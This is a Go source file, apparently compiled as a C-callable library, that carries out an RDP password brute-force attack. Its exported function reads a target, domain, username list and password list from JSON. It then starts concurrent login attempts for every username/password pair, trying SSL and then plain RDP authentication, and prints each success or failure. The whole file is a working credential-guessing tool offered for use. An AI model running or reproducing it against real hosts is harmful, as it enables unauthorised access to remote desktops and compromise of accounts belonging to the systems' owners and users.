package main

import "C"

import (
	"encoding/json"
	"fmt"
	"github.com/hi-unc1e/grdp"
	"github.com/hi-unc1e/grdp/glog"
	"io/ioutil"
	"log"
	"os"
	"strings"
	"sync"
)

var wg sync.WaitGroup

type BruteParams struct {
	Target   string `json:"target,omitempty"`
	Domain   string `json:"domain,omitempty"`
	UserFile string `json:"user_file,omitempty"`
	PassFile string `json:"pass_file,omitempty"`
}

//export RdpBruteForceAttack
func RdpBruteForceAttack(data string) int {
	var bruteParams BruteParams
	err := json.Unmarshal([]byte(data), &bruteParams)
	if err != nil {
		log.Println(err.Error())
		return 1
	}

	userFile, err := ReadAll(bruteParams.UserFile)
	if err != nil {
		log.Println(err.Error())
		return 2
	}
	passFile, err := ReadAll(bruteParams.PassFile)
	if err != nil {
		log.Println(err.Error())
		return 3
	}
	users := strings.Split(string(userFile), "\n")
	passwords := strings.Split(string(passFile), "\n")
	for _, user := range users {
		for _, password := range passwords {
			wg.Add(1)
			go Login(bruteParams.Target, bruteParams.Domain, user, password)
		}
	}
	wg.Wait()
	return 0
}

func ReadAll(filePth string) ([]byte, error) {
	f, err := os.Open(filePth)
	if err != nil {
		return nil, err
	}
	return ioutil.ReadAll(f)
}

//export Login
func Login(target, domain, username, password string) int {
	var err error
	defer wg.Done()
	g := grdp.NewClient(target, glog.NONE)
	//SSL协议登录测试
	err = g.LoginForSSL(domain, username, password)
	if err == nil {
		fmt.Println("SSL Login Success---")
		return 0
	} else {
		fmt.Println("SSL Login Error:", err)
		fmt.Println("Will try RDP Login...")
		//RDP协议登录测试
		err = g.LoginForRDP(domain, username, password)
		if err == nil {
			fmt.Println("RDP Login Success....")
			return 0
		} else {
			fmt.Println("RDP Login Error:", err)
			return 1
		}
	}
}

func main() {

}
